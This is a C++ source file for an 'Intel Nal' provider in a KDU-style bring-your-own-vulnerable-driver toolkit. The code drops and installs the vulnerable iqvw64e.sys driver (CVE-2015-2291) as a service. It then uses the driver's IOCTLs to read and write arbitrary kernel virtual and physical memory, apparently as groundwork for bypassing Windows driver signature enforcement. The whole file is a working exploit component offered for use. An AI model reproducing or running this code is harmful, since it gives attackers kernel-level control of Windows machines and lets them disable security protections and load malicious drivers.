#include "IntelNalProvider.h"
#include <iostream>
#include <vector>
#include <filesystem>
#include "../Resources/DriverDataManager.h"
#include "../ServiceManager.h"

// Helper for memory locking (similar to KDU supAllocateLockedMemory logic)
// In a real KDU implementation, this would be a utility function.
// Here we implement it inline or via VirtualLock.

namespace KernelMode {
    namespace Providers {

        IntelNalProvider::IntelNalProvider() {
            // "Nal" = Network Adapter ...
            // Usually iqvw64e.sys
        }

        IntelNalProvider::~IntelNalProvider() {
            Deinitialize();
        }

        std::wstring IntelNalProvider::GetProviderName() const {
            return L"Intel Nal (CVE-2015-2291)";
        }

        bool IntelNalProvider::Initialize(ULONG driverId, bool bypassDSE) {
            // 1. Get Driver Info
            auto& dataMgr = KernelMode::Resources::DriverDataManager::GetInstance();
            // Ensure data manager is initialized
            dataMgr.Initialize();

            // 2. Extract Driver
            // We use DRIVER_ID_INTEL_NAL which we added to DriverDataManager
            wchar_t currentDir[MAX_PATH];
            GetCurrentDirectoryW(MAX_PATH, currentDir);
            std::filesystem::path fullPath = std::filesystem::path(currentDir) / L"iqvw64e.sys";
            std::wstring extractedPath = fullPath.wstring();

            if (!dataMgr.ExtractDriver(KernelMode::Resources::DRIVER_ID_INTEL_NAL, extractedPath)) {
                std::wcerr << L"[-] Failed to extract Intel Nal driver" << std::endl;
                return false;
            }

            // 3. Load Driver Service
            KernelMode::ServiceManager svcManager;
            std::wstring serviceName = L"NalService";
            std::wstring displayName = L"Intel Nal Driver Service";

            // Try to install/start
            auto svcInfo = svcManager.InstallWithConflictResolution(serviceName, extractedPath, displayName);
            if (svcInfo.status == KernelMode::ServiceStatus::ERROR_STATE && svcInfo.serviceName.empty()) {
                 std::wcerr << L"[-] Failed to install Intel Nal service" << std::endl;
                 return false;
            }
            
            // Start it
            if (!svcManager.StartDriverService(svcInfo.serviceName)) {
                // It might already be running
                if (svcManager.CheckServiceStatus(svcInfo.serviceName).status != KernelMode::ServiceStatus::RUNNING) {
                     std::wcerr << L"[-] Failed to start Intel Nal service" << std::endl;
                     return false;
                }
            }

            // 4. Open Handle
            this->deviceName = L"\\\\.\\Nal"; // Default KDU device name
            
            // Open handle
            deviceHandle = CreateFileW(
                deviceName.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );

            if (deviceHandle == INVALID_HANDLE_VALUE) {
                // Try alternate name "NalDrv"
                 deviceHandle = CreateFileW(
                    L"\\\\.\\NalDrv",
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    nullptr,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    nullptr
                );
            }

            return (deviceHandle != INVALID_HANDLE_VALUE);
        }

        void IntelNalProvider::Deinitialize() {
            if (deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(deviceHandle);
                deviceHandle = INVALID_HANDLE_VALUE;
            }
        }

        bool IntelNalProvider::CallDriver(void* buffer, size_t size) {
            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle,
                IOCTL_NAL_MANAGE,
                buffer,
                (DWORD)size,
                nullptr,
                0,
                &bytesReturned,
                nullptr
            );
        }

        uintptr_t IntelNalProvider::VirtualToPhysical(uintptr_t virtualAddress) {
            NAL_GET_PHYSICAL_ADDRESS request = { 0 };
            request.Header.FunctionId = NAL_FUNCID_VIRTUALTOPHYSCAL;
            request.VirtualAddress = virtualAddress;

            if (CallDriver(&request, sizeof(request))) {
                return request.PhysicalAddress;
            }
            return 0;
        }

        // Internal helper to read kernel virtual memory using NAL_FUNCID_MEMMOVE
        bool IntelNalProvider::ReadVirtualMemoryInternal(uintptr_t address, void* buffer, size_t size) {
            // Buffer must be locked in physical memory for the driver to safely access it via MmMoveMemory (?) 
            // OR the driver handles it. KDU implementation uses supAllocateLockedMemory.
            // This suggests the driver expects the user buffer to be resident.
            
            // For this POC, we will try to use VirtualLock on the buffer passed in.
            // Note: VirtualLock requires the working set size to be large enough.
            
            // Ideally, we allocate a temp locked buffer.
            void* lockedBuffer = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!lockedBuffer) return false;

            if (!VirtualLock(lockedBuffer, size)) {
                 VirtualFree(lockedBuffer, 0, MEM_RELEASE);
                 return false;
            }

            NAL_MEMMOVE request = { 0 };
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = address;
            request.DestinationAddress = (ULONG_PTR)lockedBuffer;
            request.Length = size;

            bool result = CallDriver(&request, sizeof(request));
            if (result) {
                memcpy(buffer, lockedBuffer, size);
            }

            VirtualUnlock(lockedBuffer, size);
            VirtualFree(lockedBuffer, 0, MEM_RELEASE);
            return result;
        }

        bool IntelNalProvider::WriteVirtualMemoryInternal(uintptr_t address, void* buffer, size_t size) {
            void* lockedBuffer = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!lockedBuffer) return false;

            memcpy(lockedBuffer, buffer, size);

            if (!VirtualLock(lockedBuffer, size)) {
                 VirtualFree(lockedBuffer, 0, MEM_RELEASE);
                 return false;
            }

            NAL_MEMMOVE request = { 0 };
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = (ULONG_PTR)lockedBuffer; // Source is our local buffer
            request.DestinationAddress = address;            // Dest is Kernel address
            request.Length = size;

            bool result = CallDriver(&request, sizeof(request));

            VirtualUnlock(lockedBuffer, size);
            VirtualFree(lockedBuffer, 0, MEM_RELEASE);
            return result;
        }


        bool IntelNalProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            return ReadVirtualMemoryInternal(address, buffer, size);
        }

        bool IntelNalProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            return WriteVirtualMemoryInternal(address, buffer, size);
        }

        bool IntelNalProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            // Nal supports NAL_FUNCID_MAPIOSPACE
            NAL_MAP_IO_SPACE request = { 0 };
            request.Header.FunctionId = NAL_FUNCID_MAPIOSPACE;
            request.PhysicalAddress = physicalAddress;
            request.NumberOfBytes = (ULONG)size;

            if (!CallDriver(&request, sizeof(request))) return false;
            if (request.OpResult != 0) return false;

            // request.VirtualAddress is the Kernel Virtual Address of the mapped physical memory.
            // Wait, if it maps to Kernel Space, we can't read it directly from User Mode unless we use ReadKernelMemory!
            
            // So: Phys -> Map to Kernel VA -> Read Kernel VA -> Buffer
            bool readResult = ReadKernelMemory(request.VirtualAddress, buffer, size);

            // Unmap
            NAL_UNMAP_IO_SPACE unmapRequest = { 0 };
            unmapRequest.Header.FunctionId = NAL_FUNCID_UNMAPIOSPACE;
            unmapRequest.VirtualAddress = request.VirtualAddress;
            unmapRequest.NumberOfBytes = (ULONG)size;
            CallDriver(&unmapRequest, sizeof(unmapRequest));

            return readResult;
        }

        bool IntelNalProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
             NAL_MAP_IO_SPACE request = { 0 };
            request.Header.FunctionId = NAL_FUNCID_MAPIOSPACE;
            request.PhysicalAddress = physicalAddress;
            request.NumberOfBytes = (ULONG)size;

            if (!CallDriver(&request, sizeof(request))) return false;
            if (request.OpResult != 0) return false;

            // Phys -> Map to Kernel VA -> Write Kernel VA <- Buffer
            bool writeResult = WriteKernelMemory(request.VirtualAddress, buffer, size);

            // Unmap
            NAL_UNMAP_IO_SPACE unmapRequest = { 0 };
            unmapRequest.Header.FunctionId = NAL_FUNCID_UNMAPIOSPACE;
            unmapRequest.VirtualAddress = request.VirtualAddress;
            unmapRequest.NumberOfBytes = (ULONG)size;
            CallDriver(&unmapRequest, sizeof(unmapRequest));

            return writeResult;
        }

        bool IntelNalProvider::BypassDSE() {
            // Generic BYOVD DSE Bypass using Read/Write Kernel Memory
            // We can resolve checking function or global variable
            // For now, implementing standard KDU technique is complex here without symbol resolution
            // But since we have Read/Write Kernel Memory, we can use the generic method implemented in DSEBypass.cpp
            return false; // Defer to generic implementation
        }

        ULONG IntelNalProvider::GetCapabilities() const {
             return CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_VIRTUAL_MEMORY | CAPABILITY_PREFER_PHYSICAL;
        }

        const ProviderLoadData* IntelNalProvider::GetLoadData() const {
             static ProviderLoadData loadData = {
                 false, // PhysMemoryBruteForce
                 false, // PML4FromLowStub
                 true,  // PreferPhysical
                 false, // RequiresDSE
                 CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_VIRTUAL_MEMORY | CAPABILITY_PREFER_PHYSICAL, // Capabilities
                 L"Intel Nal (CVE-2015-2291)" // Description
             };
             return &loadData;
        }

        uintptr_t IntelNalProvider::AllocateKernelMemory(size_t size, uintptr_t* allocatedAddress) {
             return 0;
        }

        bool IntelNalProvider::FreeKernelMemory(uintptr_t address, size_t size) {
             return false;
        }

        bool IntelNalProvider::CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) {
             return false;
        }

    }
}
